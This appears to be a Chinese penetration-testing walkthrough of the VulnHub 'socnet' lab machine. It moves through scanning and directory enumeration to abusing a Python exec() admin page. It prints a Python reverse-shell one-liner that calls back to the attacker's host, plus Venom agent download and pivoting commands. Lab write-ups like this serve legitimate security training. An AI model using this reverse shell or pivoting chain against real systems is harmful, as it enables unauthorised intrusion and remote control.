---
title: medium_socnet靶机打靶过程和思考
url: https://buaq.net/go-146697.html
source: unSafe.sh - 不安全
date: 2023-01-26
fetch_date: 2025-10-04T04:50:08.185627
---

# medium_socnet靶机打靶过程和思考

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/5d732a462ec2a5af4e6565b43942742f.jpg)

medium\_socnet靶机打靶过程和思考

https://www.vulnhub.com/entry/boredhackerblog-social-network,454/这是一个中等难度的靶机，比较
*2023-1-25 11:12:21
Author: [xz.aliyun.com(查看原文)](/jump-146697.htm)
阅读量:29
收藏*

---

[https://www.vulnhub.com/entry/boredhackerblog-social-network,454/](https://www.vulnhub.com/entry/boredhackerblog-social-network%2C454/)

```
这是一个中等难度的靶机，比较的综合，因为其内部还有几个docker虚拟机，从而可以对内网部分有初步的涉及，比如内网信息收集、内网穿透、简单的横向移动等等
建议使用VirtualBox打开靶机，如果使用vm打开，会有无法预料的问题，其中就包括无法获取ip，内部docker没有成功启动,这样就无法扫描到对应的端口等等，所以，我会先提供靶机登录密码等，大家如果要自己打靶，那么建议启动靶机后，自己再进入其中，然后看ip和docker是否正常，保证环境没有问题之后，之后的过程会更加流畅。
```

##### 前期系统搭建

我使用的vm16打开的靶机，但是在我第一次打开的时候是没有ip的，所以建议大家用virtualbox，我也会将靶场和工具打包分享到云盘。

```
靶机IP：192.168.63.134/24
docker_ip:172.17.0.1
普通用户密码：john/1337hack
新建root用户：deel/123456

靶场百度云连接，可以用vm直接打开
链接：https://pan.baidu.com/s/1SfpcfI_7ZYDAaW4o7FOjLQ?pwd=7bsv
提取码：7bsv

这里提前给出了账号密码，主要是提供给想要练习的师傅做环境搭建验证的，新建特权用户是我分享的靶机才有，因为docker命令需要root权限才能使用，所以师傅在检验环境是否启动成功的时候直接登录deel账号即可，然后用：ifconfig命令查看eth0网卡的ip是否正确，然后用：docker ps 查看docker镜像是否启动成功，以下是截图。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125105938-4eb5b98c-9c5c-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125105947-53c871c6-9c5c-1.png)

##### 二层主机发现

```
使用工具：arp-scan  #  https://github.com/royhills/arp-scan
命令：arp-scan -l

该工具目前还在更新，官方最新版本为1.10.0,kali自带的版本22年的是1.9版本，相差不大；二层主机发现可以非常快速的发现同网段存活主机，如果是简单使用，直接加上 -l 参数即可
官方使用文档(英文):http://www.royhills.co.uk/wiki/index.php/Main_Page

通过该工具，我们发现同网段有4台其他主机，这里由于我知道另外三台主机是干什么的，所以排除法可以直接定位靶机ip：192.168.63.134。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110047-77ce6120-9c5c-1.png)

##### 全端口扫描

```
工具：nmap,masscan # https://nmap.org/     https://github.com/robertdavidgraham/masscan
命令：masscan -p1-65535 192.168.63.134 --rate=10000
     nmap -p- 192.168.63.134

这里使用了两个工具，主要是相对比两个工具的特性，同时表现出两个工具配合的效果；masscan工具有点就是速度非常快，号称可以5min扫描整个互联网，发包速度非常快，masscan不建立完整的TCP连接，收到SYN/ACK之后，发送RST结束连接,选项--banners除外。目前github的版本为1.3.2。官方使用文档就在github中。
使用示范：masscan 10.0.0.0/16 -p22-25 -oX test.xml --rate 10000
    目标是可以是单个，可以是一个段
    端口由 -p 参数指定 ：-p80  -p80,443   -p1-65535
    输出格式：-oX -> XML格式;  -oG -> grepable格式;  -oJ -> json格式
    扫描速度：默认100，比较慢，根据自己的带宽和电脑性能设置，一般 --rate=10000

nmap 如果是当前这种主机很少的情况下，扫描也很快，大概的测试一下4台主机的c段，全端口扫描下，两款工具都在十秒左右，但是在主机比较多的时候，nmap和masscan的差异就比较大了，所以如果对时间比较紧急的情况，可以考虑先用masscan快扫出主机端口信息，再用nmap针对性的对开方的端口进行指纹识别。

这一步我们通过两款工具，都扫描出靶机开放了22端口和5000端口。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110130-91593962-9c5c-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110141-97ad1b3a-9c5c-1.png)

##### 端口服务探测

```
命令：nmap -p22,5000 -sV 192.168.63.134

通过前面的端口扫描，我们发现靶机开放了 22和5000 端口，下一步就需要对端口进行服务版本方面的扫描，以获得更加详细的信息，通过nmap的 -p 参数指定端口，-sV 探测服务/版本信息，最终扫描出两个端口的服务和版本信息，其中我们发现5000端口开启了一个http服务，并且后端语言是python2.7，这些信息告诉我们或许可以通过web方面的漏洞获取权限，同时在之后的如果要命令执行或者是上传一些和后端语言相关的文件时，那需要选择用python2的相关代码。同时还有：werkzeug 这个信息，搜索过后发现这是一个Python Web框架的底层库，例如现在非常流行的Flask Web框架，对于这个靶场并没有多大的作用，不过在实际渗透过程中发现了这样的信息，说不定会有价值。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110211-a9825e88-9c5c-1.png)

```
既然是web网站，那肯定要浏览器访问看看，这个靶场开放的web页面非常的简单，只有一个类似于评论的输入框，这种地方可以考虑试一下xss，或者是sql注入，经过简单的测试，并没有成功，然后考虑继续做其他的信息收集，之后如果实在没有突破点，再来尝试此处。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110238-b9ec24b6-9c5c-1.png)

##### dirsearch

```
目录扫描：
工具：dirsearch     # https://github.com/maurosoria/dirsearch
命令：dirsearch -e "*" -u http://192.168.63.134:5000

这款工具在github上具有9.1k的star,其扫描效果也是非常出色，功能丰富，结果显示也感到非常舒适
    常用选项：
        -u http://192.168.63.1 :指定目标
        -l url.txt :指定目标列表
        -e:指定扩展名列表，用逗号隔开，可以理解成指定要扫描的文件类型，比如：-e "php,asp",如果全指定：-e "*"，这将决定字典的选择
        -w:指定自己的字典路径
        -t:线程，默认是25
        -r:递归目录(跑出目录后，继续跑目录下面的目录)
该工具还有很多的选项，详情可以 -h 逐个查看
由于近期在看一些开源工具的源代码学习，dirsearch的源代码也是大概的看了一遍，虽然有很多没有看懂，不过还是对我以后写和使用工具有了启发，这里分享给大家：
    1.关于输入目标没有带协议字段如何解决？
        这个主要的现象就是：直接输入目标域名或者ip，没有http://或者https://的协议字段，在不带端口的情况下，两种协议对应的默认端口都是不同的，如果单纯之际两个协议都加，都访问，显然不是很优雅，我在观摩的过程中找到了dirsearch的解决方法：在utils/schemedet.py文件中，通过ssl和socket库，一起实现一个ssl通信，当链接成功的时候，说明服务端是https协议，就请求成功，然后赋值协议字段为：https,如果是http就会报错，然后用except抓取到错误，然后赋值协议字段为http
        源代码：
            import ssl
            import socket

            from lib.core.settings import SOCKET_TIMEOUT
            def detect_scheme(host, port):
                if not port:
                    raise ValueError

                s = socket.socket()
                s.settimeout(SOCKET_TIMEOUT)
                conn = ssl.SSLContext().wrap_socket(s)

                try:
                    conn.connect((host, port))
                    conn.close()
                    return "https"
                except Exception:
                    return "http"
```

```
路径扫描在测试中感觉时候会有出乎意料的效果，运气好的话扫描出源代码文件，找到后台路径，找到一些有漏洞的功能页面等等。此次打靶过程中，扫描到了一个关键目录：/admin 访问发现是一个管理页面，通过提示可以看到这是一个可以通过exec()函数执行python代码的页面，我们也将通过这个页面获得靶机的权限。
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110313-ce8d0ad4-9c5c-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110323-d4b60528-9c5c-1.png)

```
工具：nc  # 下载地址：https://eternallybored.org/misc/netcat
命令：nc -lvvp 2333
nc全名叫netcat，也叫他瑞士军刀，非常强大，linux自带，但是linux的新一点的版本 -e 参数好像用不了，出于对安全的考虑。
常用参数：发起连接：nc ip port
        监听端口：nc -lvvp port
        -l： 开启监听
        -p：指定端口
        -e：程序重定向，这个参数对于反弹shell非常有用
        -v：显示执行命令过程，简单点说就是会显示更加详细的信息，建议加上

当访问靶机web的/admin页面后，发现了一个可以执行python代码的功能点，这里就存在一个python任意代码执行漏洞，我们接下来要做的就是通过执行python代码，然后反弹一个shell到我们的kali上面，这样就初步拿到了一个权限，然后通过这个shell做下一步的操作。
通过网络上找到python反弹shell代码，需要修改IP和端口为我们kali主机监听的端口，提前在kali上开启端口监听：nc -lvvp 2333,kali的ip为：192.168.63.246
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.63.246",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

这里放上一个收集了很多命令执行代码的网站，同时这个网站还有其他的丰富的资源：https://forum.ywhack.com/shell.php
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110353-e640bba8-9c5c-1.png)

```
拿到shell后，发现自己是root权限，如果是真的，那肯定非常高兴，都不用提权了，但是对于这个靶场，并不会这么简单。docker作为一种非常强大的技术，渗透过程中也是经常遇到，这个靶场就使用docker，我们此时获得的权限是一个docker虚拟机的权限，这里主要说明如何判断自己拿到的是不是一个docker：
    1.根目录下是否存在：.dockerenv文件：ls /.dockerenv文件  90%是docker
    2.cat /proc/1/cgroup文件，如果这个文件里面有***/docker/一串字符,有这样的内容时，那么百分之百时docker文件
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110415-f379b59a-9c5c-1.png)

docker主机：cat /proc/1/cgroup 可以看到有docker关键字

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110431-fcc8d874-9c5c-1.png)

linux物理机：cat /proc/1/cgroup 则没有docker关键字

kali

```
工具：venom  #  https://github.com/Dliv3/Venom
命令：服务端(kali)： ./admin_linux_x64 -lport 9999
                  当客服端连接上来后，服务端需要执行的命令
                  show   # 显示当前连接上来的节点
                    goto 1   #  进入靶机的节点
                    socks 1080  #  启动1080端口的socket代理，后面kali设置代理的时候，就设置：127.0.0.1 1080
    客服端(靶机)：./agent_linux_x64 -rhost 192.168.63.246(kali-ip) -rport 9999(服务端监听的端口)

使用：
    使用kali的proxychains工具  # https://github.com/haad/proxychains
    vim /etc/proxychains4.conf
    最下方修改：socks5 127.0.0.1 1080
    使用：在要使用的工具前面加上：proxychains即可：如：proxychains  nmap -pn -sT 172.17.0.1

当我们发现是docker的时候，首先考虑的应该是想办法docker逃逸，但是这个靶场想要考察的内容估计不是这个方向，所以对docker网段做了一个初步信息收集发现，还存在其他docker虚拟机，于是做内网穿透，对docker所在的网段的其他主机进行更加细致的扫描。venom客户端上传到靶机的这一步，我通过kali的python3 -m http.server 80 开启了一个临时的web服务，然后在dokcer的shell中通过wget http://192.168.63.246/agent_linux_x64 将客户端工具下载到靶机docker中，并赋权运行。
```

开启web服务

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110537-24a253fc-9c5d-1.png)

启动服务端

![](https://xzfile.aliyuncs.com/media/upload/picture/20230125110558-30...